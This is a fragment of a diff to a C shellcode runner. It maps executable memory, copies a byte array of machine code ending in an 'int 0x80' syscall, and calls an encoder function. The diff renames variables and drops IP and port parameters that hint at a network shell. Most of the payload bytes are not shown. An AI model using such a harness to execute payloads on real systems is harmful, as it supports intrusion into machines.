@@ -67,7 +67,7 @@ char SHX[] = {
   /* 0023 */ "\xcd\x80"                     /* int 0x80                        */
 };
 
-void xcode(char *s, int len, uint32_t ip, int16_t port)
+void xcode(char *s, int len)
 {
   uint8_t *p;
   
@@ -89,10 +89,10 @@ int main(int argc, char *argv[])
       PROT_EXEC | PROT_WRITE | PROT_READ, 
       MAP_ANON  | MAP_PRIVATE, -1, 0); 
       
-  if (p != NULL) {
-    memcpy (p, SHX, sizeof(SHX));    
-    xcode (EGG, GG_SIZE);
-    munmap((void*)p, sizeof(SHX));
+  if (sc != NULL) {
+    memcpy (sc, SHX, sizeof(SHX));    
+    xcode (EGG, EGG_SIZE);
+    munmap((void*)sc, sizeof(SHX));
   }
   return 0;  
 }
